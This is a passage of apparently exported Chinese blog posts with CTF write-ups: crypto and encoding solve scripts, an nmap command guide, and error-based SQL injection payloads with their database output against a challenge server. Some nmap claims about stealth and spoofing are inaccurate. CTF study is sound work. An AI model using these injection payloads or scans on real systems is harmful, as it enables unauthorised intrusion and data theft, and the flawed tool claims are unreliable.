WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0x 而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？ base64解密获得 [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] 对n进行因式分解获得pq 分解p q网站 然后一个解密脚本 # encoding:utf8 import rsa import sys import gmpy2 marr= [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] p = 54163 q = 101929 n = 5520780427 e = 134257 d= int(gmpy2.invert(e , (p-1) * (q-1))) result=&quot;&quot; for j in marr: result += chr(pow(j,d,n)) print result 得到 U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5 对其进行DES解密 得到flag jactf{So_easy_RSA_and_DES} 贝叶斯打开是一个密码本 需要解密 仿射密码 脚本如下 #include &lt;iostream&gt; #include &lt;cstring&gt; using namespace std; int gcd(int m, int n); int init_gcd(int m, int n); int des_find(string p, int m); #define PSIZE 65 //宏定义密码表大小 int main() { string P(&quot;zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert{yuiop}0123498765&quot;), M(&quot;gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7&quot;); //明文空间，与已知密文 string C; //存放解密明文 int i = 2; //求解所有互素的数 int a1; //存放逆元 for (i; i &lt; PSIZE; i++) { if (gcd(i, PSIZE) == 1) { //说明此时的i与28互素 /***求解此时的i的逆元***/ a1 = init_gcd(i, PSIZE); for (int j = 0; j &lt; PSIZE; j++) //控制b的遍历 { cout &lt;&lt; &quot;此时：a=&quot; &lt;&lt; i &lt;&lt; &quot; b=&quot; &lt;&lt; j &lt;&lt; &quot; a的逆元为：&quot; &lt;&lt; a1 &lt;&lt; &quot; \\&quot;&quot;; for (int k = 0; k &lt; M.length(); k++) { //每一个汉字站两个字节，所以要用两个数组空间来存 int where = des_find(P, M[k]); //匹配密文在明文空间的位置 where = ((where - j)*a1) % PSIZE; if (where &lt; 0) { where += PSIZE; } cout &lt;&lt; P[where]; } cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; endl; } } } return 0; } int gcd(int b, int a) //求互素 { int temp; if (a &lt; b)//判断大小 { temp = a; a = b; b = temp; } if (b == 0) return a; else return gcd(b, a%b);//递归 } int init_gcd(int m, int n) //扩展欧几里得算法 { int i = 2; for (i; i &lt; 28; i++) { if ((m*i) % n == 1) { return i; } } } int des_find(string p, int m) //位置匹配函数 { for (int i = 0; i &lt; p.length(); i ++) { //cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl; if (m == p[i]) { return i; } } } 跑出来 找到了flag jactf{I_10ve_Crypto_Yov_t0O_e8963F5} 不会奔跑的数字和下划线打开题目发现是 url加密 加密之后 进行base16解密 最后进行base64解密 得到 和flag长得相似的字符串 NEGXJ{48_ter_119_xsoirw_teww} 根据题目 我们只考虑字母发现这一些字符前五位和JACTF的ascii码相差5 str = &quot;NEGXJ{48_ter_119_xsoirw_teww}&quot; str_2 = &quot;NEGXJterxsoirwteww&quot; flag = &quot;&quot; x = 4 for i in str: if i.isalpha(): flag += chr(int(ord(i)-x)) else: flag += i print flag 得到flag: JACTF{48_pan_119_tokens_pass}","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"nmap的使用","slug":"nmap的使用","date":"2019-04-08T15:13:29.000Z","updated":"2019-05-29T12:42:50.249Z","comments":true,"path":"2019/04/08/nmap的使用/","link":"","permalink":"http://yoursite.com/2019/04/08/nmap的使用/","excerpt":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。","text":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。 nmap的主要功能 探测一组主机是否在线 扫描主机的端口，嗅探所提供的网络服务 推断主机所使用的操作系统 nmap 端口状态的判断open : 应用程序在该端口接受TCP连接或者UDP报文 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 nmap的基础语法 namp -A [ip地址]全面扫描指定IP namp 192.168.1.1/24扫描整个子网 nmap [ip地址1] [ip地址2]扫描多个目标 nmap 192.168.1.1-100扫描一个范围内的目标 扫描ip地址为192.168.1.1-192.168.1.100内的所有主机 nmap -iL 1.txt扫描1.txt下的所有的IP列表 nmap -sL 192.168.1.1/24可以看到你扫描的所有主机的列表 nmap 192.168.1.1/24 -exclude 192.168.1.1扫描除了某一个ip外的所有子网主机 nmap 192.168.1.1/24 -exclude 1.txt`扫描除了某一个文件中ip外的子网主机 - nmap -p80,21,23 192.168.1.1 扫描特定主机的80，21，23端口 - nmap -p 80-160 192.168.0.101 扫描指定范围内的端口 - nmap 192.168.0.101,102,103 使用IP地址的最后一个字节扫描多台服务器 以上为nmap的最常用的基础命令 - nmap -sP 192.168.43.8/24 ping扫描方式，只进行ping，然后显示在线的主机。这样获取目标信息而不会被轻易发现发现。ping扫描只是判断主机是否存活在网络中。 - nmap -P0 192.168.1.1 无ping扫描：通常用于防火墙禁止ping的情况下，它能确定正在运行的机器。 nmap -P0 [协议1、协议2] [目标ip]nmap支持的协议和编号1.tcp:对应的协议编号为62.ICMP:对应的协议编号为13.IGMP：对应的协议编号为24.UDP：对应的协议编号为17通过使用TCP、UDP、IGMP协议向目标主机发送包并判断目标主机是否在线 - nmap -sS 192.168.1.1 不会在目标主机产生日志信息，通过TCP的SYN包获取主机信息 - nmap -sT 192.168.1.1 适用于找出TCP和UDP端口 - nmap -sU 192.168.1.1 用来扫描主机打开的UDP端口：不会发送syn包，通过发送udp数据包到目标主机，等待目标主机响应，返回ICMP不可达，代表端口关闭。 - nmap -sF 192.168.1.1 不会在目标主机产生日志信息如果TCP SYN被防火墙拦截，用FIN标志的数据包获取主机信息。（FIN重置位，用来代表断开连接） - nmap -sV 192.168.1.1 扫描目标主机的端口上运行的软件版本 它不是用于扫描目标主机开放的端口，但需要从开放的端口获取信息来判断软件的版本，所以需要先进行端口扫描。 - nmap -sL 192.168.1.7 192.168.1.1 伪装一个主机的ip发送扫描数据包 - nmap -A 192.168.1.1 检测目标主机系统信息和路由信息 - nmap -O 192.168.1.1 检测目标主机操作系统和软件 - nmap -sA 192.168.1.1 扫描住的侦测防火墙 - nmap -PN 192.168.1.1 扫描主机是不是由防火墙的保护 - nmap -F 192.168.1.1 快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其他端口 - nmap -r 192.168.1.1 顺序扫描端口 - nmap --iflist 打印本地主机接口和路由 - nmap -sN 192.168.1.1 TCP空扫描`","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/tags/安全工具/"}]},{"title":"2019年嘉韦思杯wp","slug":"上海嘉韦思杯","date":"2019-03-30T16:00:00.000Z","updated":"2019-05-29T12:33:15.805Z","comments":true,"path":"2019/03/31/上海嘉韦思杯/","link":"","permalink":"http://yoursite.com/2019/03/31/上海嘉韦思杯/","excerpt":"2019年嘉韦思杯wp","text":"2019年嘉韦思杯wp 土肥原贤二发现存在报错注入的可能： 于是进行尝试 1&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# 得到信息： could not to the database XPATH syntax error: &#39;~5.7.25-log~&#39; 爆库： 1&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# could not to the database XPATH syntax error: &#39;~luozhen~&#39; 爆表： 1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)# could not to the database XPATH syntax error: &#39;~flag,goods~&#39; 爆列名： 1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),0x7e),1)# could not to the database XPATH syntax error: &#39;~id,flag~&#39; 得到flag: 1&#39; and updatexml(1,concat(0x7e,(SELECT flag from flag),0x7e),1)# could not to the database XPATH syntax error: &#39;~20_welcome_19~&#39; flag{20_welcome_19} 吴佩孚打开连接发现是特别长的一个字符串 二话不说直接base64解码 (![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]) 这个是jsfuck加密在线解密 得到flag flag{sdf465454dfgert32} 死亡真相发现是一段声音录像 将WAV文件放入Audacity中 查看频普图发现提示 flag：85a9d4517d4725_b9_8cbc9fd_554216 但是提交不上去 发现是个假的flag 通过查看文件属性发现多次出现0于是将_替换为0 ： 85a9d4517d47250b908cbc9fd0554216 再由md5解密可得flag：hsd132456 日军空袭发现这有事以长传的字符串 老样子 base64解码 这下需要点好多次 fB__l621a4h4g_ai{&amp;i} 的到这样的字符串 仔细观察 发现别有玄机 fB__ l621 a4h4 g_ai {&amp;i} 竖着看就可得到flag flag{B64_&amp;_2hai_14i} 戴星炳打开页面 天下武功，唯快不破！你能在2秒内算出下面的数学表达式结果吗？ 0x11 * (0x63 + 0xEE) + ( 0x30 ^ 0x1C) + 0x8D % 0xF6 + 0x19 这就要写脚本跑一下了 #!/usr/bin/python #coding=utf-8 import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) s = requests.Session() url = &#39;http://47.103.43.235:82/web/a/index.php&#39; r = s.get(url=url) # print r.text a = re.search(r&#39;&lt;/p&gt;&lt;p&gt;(.*)&lt;/p&gt;\\n&lt;form&#39;, r.text, re.M | re.S).group(1) res = eval(a) data ={ &#39;result&#39;:res, &#39;Submit&#39;:&#39;Submit&#39; } print eval(a) b =s.post(url=url,data=data) print b.text 得到flag flag{Y0U_4R3_3o_F4ST!} 大美晚报打开题目链接后是一个二维码，保存下来binwalk一下发现存在压缩包，-e参数分离出来 打开后发现有加密，但是给出来提示 那这就好办了，密码全部是数字，可以用压缩包爆破神器ARCHPR.exe来进行爆破，时间比较长,爆破出来密码是：674290437 flag：flag{d6@YX$_m^aa0} 得到flag：flag{d6@YX$_m^aa0} 潘汉年打开得到了一个字符串 bg[`sZ*Zg&#39;dPfP`VM_SXVd 想了一下 有可能会和ascii码有关所以 bg[`sZ*Zg&#39;dPfP`VM_SXVd的ASCII码为： 98,103,91,96,115,90,42,90,103,39,100,80,102,80,96,86,77,95,83,88,86,100 flag的ASCII码为： 102,108,97,103 观察发现他们的第一位 相差4 第二位相差5 第三位相差6 str = &quot;bg[`sZ*Zg&#39;dPfP`VM_SXVd&quot; # str_1 = &quot;flag&quot; flag = &quot;&quot; j=4 for i in range(len(str)): flag += 